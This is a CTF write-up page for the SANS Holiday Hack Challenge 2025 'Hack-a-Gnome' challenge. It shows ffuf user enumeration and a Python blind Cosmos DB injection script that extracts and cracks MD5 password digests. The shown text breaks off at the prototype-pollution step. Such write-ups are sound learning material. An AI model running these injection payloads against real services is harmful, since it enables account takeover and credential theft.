<!DOCTYPE html>
<html lang="en-us" dir="ltr" itemscope itemtype="http://schema.org/Article" data-r-output-format="html">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <meta name="generator" content="Hugo 0.152.2">
    <meta name="generator" content="Relearn 8.2.0+926ba4d1230e27319cf62da0633eb3420e6af1bf">
    <meta name="description" content="Objective Difficulty Description 3/5 Davis in the Data Center is fighting a gnome armyâ€”join the hack-a-gnome fun. Chris Daves mission statement Hi, my name is Chris.
I like miniature war gaming and painting minis.
I enjoy open source projects and amateur robotics.
Hiking and kayaking are my favorite IRL activies.
I love single player video games with great stoylines.
Hey, I could really use another set of eyes on this gnome takeover situation.">
    <meta name="author" content="">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Hack-a-Gnome :: SANS Holiday Hack Challenge 2025">
    <meta name="twitter:description" content="Objective Difficulty Description 3/5 Davis in the Data Center is fighting a gnome armyâ€”join the hack-a-gnome fun. Chris Daves mission statement Hi, my name is Chris.
I like miniature war gaming and painting minis.
I enjoy open source projects and amateur robotics.
Hiking and kayaking are my favorite IRL activies.
I love single player video games with great stoylines.
Hey, I could really use another set of eyes on this gnome takeover situation.">
    <meta property="og:url" content="http://localhost:1313/act3/hack-a-gnome/_index-copy/index.html">
    <meta property="og:site_name" content="SANS Holiday Hack Challenge 2025">
    <meta property="og:title" content="Hack-a-Gnome :: SANS Holiday Hack Challenge 2025">
    <meta property="og:description" content="Objective Difficulty Description 3/5 Davis in the Data Center is fighting a gnome armyâ€”join the hack-a-gnome fun. Chris Daves mission statement Hi, my name is Chris.
I like miniature war gaming and painting minis.
I enjoy open source projects and amateur robotics.
Hiking and kayaking are my favorite IRL activies.
I love single player video games with great stoylines.
Hey, I could really use another set of eyes on this gnome takeover situation.">
    <meta property="og:locale" content="en_us">
    <meta property="og:type" content="article">
    <meta property="article:section" content="Act 3">
    <meta property="article:published_time" content="2025-11-30T11:47:39+01:00">
    <meta property="article:modified_time" content="2025-11-30T11:47:39+01:00">
    <meta itemprop="name" content="Hack-a-Gnome :: SANS Holiday Hack Challenge 2025">
    <meta itemprop="description" content="Objective Difficulty Description 3/5 Davis in the Data Center is fighting a gnome armyâ€”join the hack-a-gnome fun. Chris Daves mission statement Hi, my name is Chris.
I like miniature war gaming and painting minis.
I enjoy open source projects and amateur robotics.
Hiking and kayaking are my favorite IRL activies.
I love single player video games with great stoylines.
Hey, I could really use another set of eyes on this gnome takeover situation.">
    <meta itemprop="datePublished" content="2025-11-30T11:47:39+01:00">
    <meta itemprop="dateModified" content="2025-11-30T11:47:39+01:00">
    <meta itemprop="wordCount" content="2925">
    <title>Hack-a-Gnome :: SANS Holiday Hack Challenge 2025</title>
    <link href="/css/auto-complete/auto-complete.min.css?1765551805" rel="stylesheet">
    <script src="/js/auto-complete/auto-complete.min.js?1765551805" defer></script>
    <script src="/js/search-lunr.js?1765551805" defer></script>
    <script src="/js/search.js?1765551805" defer></script>
    <script>
      window.relearn = window.relearn || {};
      window.relearn.index_js_url="/searchindex.en.js?1765551805";
    </script>
    <script src="/js/lunr/lunr.min.js?1765551805" defer></script>
    <script src="/js/lunr/lunr.stemmer.support.min.js?1765551805" defer></script>
    <script src="/js/lunr/lunr.multi.min.js?1765551805" defer></script>
    <script src="/js/lunr/lunr.en.min.js?1765551805" defer></script>
    <script>
      window.relearn = window.relearn || {};
      window.relearn.contentLangs=['en'];
    </script>
    <link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765551805" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765551805" rel="stylesheet"></noscript>
    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1765551805" rel="stylesheet">
    <link href="/css/theme.css?1765551805" rel="stylesheet">
    <link href="/css/format-html.css?1765551805" rel="stylesheet" id="R-format-style">
    <script>
      window.relearn = window.relearn || {};
      // configuration
      window.relearn.min = ``;
      window.relearn.path='\/act3\/hack-a-gnome\/_index-copy\/index.html';
      window.relearn.relBasePath='..\/..\/..';
      window.relearn.relBaseUri='..\/..\/..';
      window.relearn.absBaseUri='http:\/\/localhost:1313';
      window.relearn.disableAnchorCopy=false;
      window.relearn.disableAnchorScrolling=false;
      window.relearn.disableInlineCopyToClipboard=false;
      window.relearn.enableBlockCodeWrap=true;
      // legal
      window.relearn.getItem = (s,n) => {return s.getItem(n)};
      window.relearn.setItem = (s,n,v) => {return s.setItem(n,v)};
      window.relearn.removeItem = (s,n) => {return s.removeItem(n)};
      // translations
      window.T_Copy_to_clipboard = `Copy to clipboard`;
      window.T_Copied_to_clipboard = `Copied to clipboard!`;
      window.T_Copy_link_to_clipboard = `Copy link to clipboard`;
      window.T_Link_copied_to_clipboard = `Copied link to clipboard!`;
      window.T_Reset_view = `Reset view`;
      window.T_View_reset = `View reset!`;
      window.T_No_results_found = `No results found for "{0}"`;
      window.T_N_results_found = `{1} results found for "{0}"`;
      // variant stuff
      window.relearn.themevariants = [ 'hhc-2025' ];
      window.relearn.customvariantname = "my-custom-variant";
      window.relearn.changeVariant = function(variant) {
        var oldVariant = document.documentElement.dataset.rThemeVariant;
        window.relearn.setItem(window.localStorage, window.relearn.absBaseUri + "/variant", variant);
        document.documentElement.dataset.rThemeVariant = variant;
        if (oldVariant != variant) {
          document.dispatchEvent( new CustomEvent('themeVariantLoaded', { detail: { variant, oldVariant } }) );
          window.relearn.markVariant();
        }
      }
      window.relearn.markVariant = function() {
        var variant = window.relearn.getItem(window.localStorage, window.relearn.absBaseUri + "/variant");
        document.querySelectorAll(".R-variantswitcher select").forEach((select) => {select.value = variant;});
      }
      window.relearn.initVariant = function() {
        var variant = window.relearn.getItem(window.localStorage, window.relearn.absBaseUri + "/variant") ?? "";
        if( variant == window.relearn.customvariantname ){
        }else if( !variant || !window.relearn.themevariants.includes(variant) ){
          variant = window.relearn.themevariants[0];
          window.relearn.setItem(window.localStorage, window.relearn.absBaseUri + "/variant", variant);
        }
        document.documentElement.dataset.rThemeVariant = variant;
      }
      window.relearn.initVariant();
      window.relearn.markVariant();
    </script>
  </head>
  <body class="mobile-support html" data-url="/act3/hack-a-gnome/_index-copy/index.html">
    <div id="R-body" class="default-animation">
      <div id="R-body-overlay"></div>
      <nav id="R-topbar">
        <div class="topbar-wrapper">
          <div class="topbar-sidebar-divider"></div>
          <div class="topbar-area topbar-area-start" data-area="start">
            <div class="topbar-button topbar-button-sidebar" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide">
<span class="btn cstyle link noborder notitle interactive"><button onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)"><i class="fa-fw fas fa-bars"></i></button></span>
            </div>
            <div class="topbar-button topbar-button-toc" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
<span class="btn cstyle link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)"><i class="fa-fw fas fa-list-alt"></i></button></span>
              <div class="topbar-content">
                <div class="topbar-content-wrapper">
<nav class="TableOfContents">
  <ul>
    <li><a href="#objective">Objective</a></li>
    <li><a href="#chris-daves-mission-statement">Chris Daves mission statement</a></li>
    <li><a href="#solution">Solution</a>
      <ul>
        <li><a href="#getting-access-to-the-control-panel">Getting access to the control panel</a></li>
        <li><a href="#exploiting-the-control-panel">Exploiting the control panel</a></li>
        <li><a href="#operating-the-reverse-shell">Operating the reverse shell</a></li>
        <li><a href="#enumerating-control-codes">Enumerating control codes</a></li>
      </ul>
    </li>
    <li><a href="#resources">Resources</a></li>
    <li><a href="#chris-davis-mission-debrief">Chris Davis mission debrief</a>
      <ul>
        <li><a href="#hints">Hints</a></li>
      </ul>
    </li>
  </ul>
</nav>
                </div>
              </div>
            </div>
          </div>
          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/index.html"><span itemprop="name">Intro</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/act3/index.html"><span itemprop="name">Act 3</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/act3/hack-a-gnome/index.html"><span itemprop="name">Hack-a-Gnome</span></a><meta itemprop="position" content="3">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><span itemprop="name">Hack-a-Gnome</span><meta itemprop="position" content="4"></li>
          </ol>
          <div class="topbar-area topbar-area-end" data-area="end">
            <div class="topbar-button topbar-button-prev" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
<span class="btn cstyle link noborder notitle interactive"><a href="/act3/hack-a-gnome/index.html" title="Hack-a-Gnome (ðŸ¡)"><i class="fa-fw fas fa-chevron-left"></i></a></span>
            </div>
            <div class="topbar-button topbar-button-next" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
<span class="btn cstyle link noborder notitle interactive"><a href="/act3/snowcat-rce-and-priv-esc/index.html" title="Snowcat RCE & Priv Esc (ðŸ¡’)"><i class="fa-fw fas fa-chevron-right"></i></a></span>
            </div>
            <div class="topbar-button topbar-button-more" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
<span class="btn cstyle link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button></span>
              <div class="topbar-content">
                <div class="topbar-content-wrapper">
                  <div class="topbar-area topbar-area-more" data-area="more">
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </nav>
      <div id="R-main-overlay"></div>
      <main id="R-body-inner" class="highlightable act3" tabindex="-1">
        <div class="flex-block-wrapper">
<article class="default">
  <header class="headline">
  </header>

<h1 id="hack-a-gnome">Hack-a-Gnome</h1>

<p><a href="#R-image-28a0f406bde685c12348b738f929398b" class="lightbox-link"><img alt="Chris Daves" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/chrisdavis-avatar.gif" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-28a0f406bde685c12348b738f929398b"><img alt="Chris Daves" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/chrisdavis-avatar.gif"></a></p>
<h2 id="objective">Objective</h2>
<table>
  <thead>
      <tr>
          <th>Difficulty</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>3/5</td>
          <td>Davis in the Data Center is fighting a gnome armyâ€”join the hack-a-gnome fun.</td>
      </tr>
  </tbody>
</table>
<h2 id="chris-daves-mission-statement">Chris Daves mission statement</h2>
<blockquote>
<p>Hi, my name is Chris.</p>
<p>I like miniature war gaming and painting minis.</p>
<p>I enjoy open source projects and amateur robotics.</p>
<p>Hiking and kayaking are my favorite IRL activies.</p>
<p>I love single player video games with great stoylines.</p>
<hr>
<p>Hey, I could really use another set of eyes on this gnome takeover situation.</p>
<p>Their systems have multiple layers of protection now - database authentication, web application vulnerabilities, and more!</p>
<p>But every system has weaknesses if you know where to look.</p>
<p>If these gnomes freeze the whole neighborhood, forget about hiking or kayakingâ€”everything will be one giant ice rink. And trust me, miniature war gaming is a lot less fun when your paint freezes solid.</p>
<p>Ready to help me turn one of these rebellious bots against its own kind?</p>
</blockquote>
<h2 id="solution">Solution</h2>
<h3 id="getting-access-to-the-control-panel">Getting access to the control panel</h3>
<p>When opening the URL <a href="https://hhc25-smartgnomehack-prod.holidayhackchallenge.com" rel="external">https://hhc25-smartgnomehack-prod.holidayhackchallenge.com</a> we are presented with the following landing page:</p>
<p><a href="#R-image-ba9a2ab21586de537ee9bee59c7441c2" class="lightbox-link"><img alt="First landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-6.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-ba9a2ab21586de537ee9bee59c7441c2"><img alt="First landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-6.png"></a></p>
<p>By inspecting the HTML source of the mainpage we found an interesting Javascript file, <code>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/static/script.js</code>. By reading it we got to know a few interesting endpoints:</p>
<table>
  <thead>
      <tr>
          <th>Endpoint</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>/register</td>
          <td>Endpoint for registering a new user</td>
      </tr>
      <tr>
          <td>/userAvailable?username=</td>
          <td>In use to check wheter a username is available for registion upon creating a new user</td>
      </tr>
  </tbody>
</table>
<h4 id="identifying-the-database">Identifying the database</h4>
<p>We identified the endpoints above, and the only endpoint taking arguments seems to be the <code>userAvailable</code> one. We were able to provoke an error message by sending in an <code>&quot;</code> to the this endpoint like so:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span></span></span></code></pre></div>
<p>This resulted in the following error:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;error&#34;</span>:<span style="color:#e6db74">&#34;An error occurred while checking username: Message: {\&#34;errors\&#34;:[{\&#34;severity\&#34;:\&#34;Error\&#34;,\&#34;location\&#34;:{\&#34;start\&#34;:44,\&#34;end\&#34;:45},\&#34;code\&#34;:\&#34;SC1012\&#34;,\&#34;message\&#34;:\&#34;Syntax error, invalid string literal token &#39;\\\&#34;&#39;.\&#34;}]}\r\nActivityId: fc87623e-4f9b-4d3d-9b18-f56fefa1b5d9, Microsoft.Azure.Documents.Common/2.14.0&#34;</span>}</span></span></code></pre></div>
<p>After a quick check using ChatGPT, it appears we are dealing with <em>Cosmos DB</em> here.</p>
<h4 id="enumerating-users">Enumerating users</h4>
<p>From the hints we are now to enumerate the users in the database. This seemed straight forward using <em>FFUF</em> with a list of common names:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -u https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username<span style="color:#f92672">=</span>FUZZ -X GET -fr <span style="color:#e6db74">&#34;true&#34;</span></span></span></code></pre></div>
<p>The feedback from the server basically states <em>available: true or false</em>, thus we easily added the <code>-fr</code> option find users not available. We quickly identify the following users:</p>
<ul>
<li>bruce</li>
<li>harold</li>
</ul>
<h4 id="enumerating-the-database">Enumerating the database</h4>
<p>We don&rsquo;t know Cosmos DB at all. But from looking at syntax examples online, every example seems to go like this:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> p <span style="color:#66d9ef">WHERE</span> p.something <span style="color:#f92672">=</span> something</span></span></code></pre></div>
<p>From this we formed the following workflow:</p>
<ol>
<li>Identify &ldquo;p&rdquo; - what value could be in use here?</li>
<li>Identify fields in use, Cosmos DB doesn&rsquo;t have a set schema</li>
<li>Extract password, if even possible</li>
</ol>
<p>For this excercise we decided to leave FFUF for now an move on to Python, since that is where we work the most:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pprint <span style="color:#f92672">import</span> pprint
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Helper function for injection</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">inject</span>(base_url: str, payload: str) <span style="color:#f92672">-&gt;</span> str:
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> base_url <span style="color:#f92672">+</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>json()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Map out prefix</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_prefix</span>(url, username):
</span></span><span style="display:flex;"><span>    prefix_letter <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> prefix <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>ascii_letters:
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; AND IS_DEFINED(</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">.username) --&#39;</span>
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> inject(base_url, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">in</span> result<span style="color:#f92672">.</span>keys():
</span></span><span style="display:flex;"><span>        	<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        prefix_letter <span style="color:#f92672">=</span> prefix
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> prefix_letter
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Find password field name</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_password_field</span>(url, username, prefix):
</span></span><span style="display:flex;"><span>	fields <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;burp-parameter-names.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f<span style="color:#f92672">.</span>readlines():
</span></span><span style="display:flex;"><span>			needle <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>			payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; AND IS_DEFINED(</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{</span>needle<span style="color:#e6db74">}</span><span style="color:#e6db74">) --&#39;</span>
</span></span><span style="display:flex;"><span>			result <span style="color:#f92672">=</span> inject(url, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">in</span> result<span style="color:#f92672">.</span>keys():
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> result<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;available&#34;</span>) <span style="color:#f92672">is</span> <span style="color:#66d9ef">False</span>:
</span></span><span style="display:flex;"><span>				fields<span style="color:#f92672">.</span>append(needle)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> fields
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Find digest</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_digest</span>(base_url, prefix, candidate<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>, username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;-&#34;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> c <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#34;:&#34;</span>]:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> candidate <span style="color:#f92672">+</span> c
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; AND STARTSWITH(</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">.digest, &#34;</span><span style="color:#e6db74">{</span>p<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;) --&#39;</span>
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> inject(base_url, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print(payload)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> result[<span style="color:#e6db74">&#34;available&#34;</span>] <span style="color:#f92672">is</span> <span style="color:#66d9ef">False</span>:
</span></span><span style="display:flex;"><span>            print(p)
</span></span><span style="display:flex;"><span>            find_digest(base_url, prefix, p, username)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Main logic</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>base_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=&#34;</span>
</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> find_prefix(base_url, <span style="color:#e6db74">&#34;harold&#34;</span>)
</span></span><span style="display:flex;"><span>fields <span style="color:#f92672">=</span> find_password_field(base_url, <span style="color:#e6db74">&#34;harold&#34;</span>, prefix)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Prefix is: </span><span style="color:#e6db74">{prefix}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Document fields is: &#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">*&#34;</span><span style="color:#f92672">.</span>join(fields))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>find_digest(base_url, prefix, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;harold&#34;</span>)
</span></span><span style="display:flex;"><span>find_digest(base_url, prefix, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;bruce&#34;</span>)</span></span></code></pre></div>
<p>From running this script we learn that the <code>p</code> we were looking for was actually <code>c</code>. Furhter we identified the following document fields:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ID
</span></span><span style="display:flex;"><span>Id
</span></span><span style="display:flex;"><span>USERNAME
</span></span><span style="display:flex;"><span>UserName
</span></span><span style="display:flex;"><span>Username
</span></span><span style="display:flex;"><span>digest
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>userName
</span></span><span style="display:flex;"><span>username</span></span></code></pre></div>
<p>There are no &ldquo;password&rdquo; field, however we identified a <code>digest</code> field, which kinda is the same thing. Moving on we bruteforced the <code>digest</code> field for the two users we have found, and this is what we got:</p>
<table>
  <thead>
      <tr>
          <th>Username</th>
          <th>Digest (MD5)</th>
          <th>Decoded</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>bruce</td>
          <td>d0a9ba00f80cbc56584ef245ffc56b9e</td>
          <td>oatmeal12</td>
      </tr>
      <tr>
          <td>harold</td>
          <td>07f456ae6a94cb68d740df548847f459</td>
          <td>oatmeal!!</td>
      </tr>
  </tbody>
</table>
<p>The digest (passwords) were stored as MD5 - by simply visiting <a href="https://crackstation.net" rel="external">Crackstation</a> we decoded them easily</p>
<h3 id="exploiting-the-control-panel">Exploiting the control panel</h3>
<p>Upon logging in to the control panel we are presented with this landingpage:</p>
<p><a href="#R-image-7b9ef019321a4b5495490de62f7ed6f3" class="lightbox-link"><img alt="Landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-1.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-7b9ef019321a4b5495490de62f7ed6f3"><img alt="Landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-1.png"></a></p>
<p>From inspecting the HTML source code and Javascript code we find the following endpoints:</p>
<table>
  <thead>
      <tr>
          <th>Endpoint</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>/home</td>
          <td>Mainpage, contains two iframes, one for <em>Smart Gnome Statistics</em> panel and <em>Gnome Control Interface</em></td>
      </tr>
      <tr>
          <td>/stats</td>
          <td><em>Smart Gnome Statistics</em> panel</td>
      </tr>
      <tr>
          <td>/control</td>
          <td><em>Gnome Control Interface</em> - where the robot game plays out</td>
      </tr>
      <tr>
          <td>/register</td>
          <td>Endpoint for registering a new user</td>
      </tr>
      <tr>
          <td>/ctrlsignals?message=</td>
          <td>This is used to communicate with backend, for instance updating the robot name. Takes an urlencoded JSON object as input to &lsquo;message&rsquo; argument</td>
      </tr>
  </tbody>
</table>
<h4 id="finding-exploitable-vector">Finding exploitable vector</h4>
<p>From the endpoints we see that there is just one endpoint taking any form of input, <em>/ctrlsignals</em>. We know from the hints that we are facing prototype poisoning, and this endpoint seems to fit the bill. So lets toy some further.</p>
<p>By sending a single <em>&rsquo;</em> we can make the system fail at parsing the input:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>SyntaxError: Unexpected token &#39; in JSON at position 0 Â  Â at JSON.parse (&lt;anonymous&gt;) Â  Â at /app/server.js:121:33 Â  Â at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) Â  Â at next (/app/node_modules/express/lib/router/route.js:149:13) Â  Â at Route.dispatch (/app/node_modules/express/lib/router/route.js:119:3) Â  Â at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) Â  Â at /app/node_modules/express/lib/router/index.js:284:15 Â  Â at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12) Â  Â at next (/app/node_modules/express/lib/router/index.js:280:10) Â  Â at /app/server.js:49:9</code></pre></div>
<p>Provoking error message to confirm <em>__proto__</em> vulnerability in EJS templating system;</p>
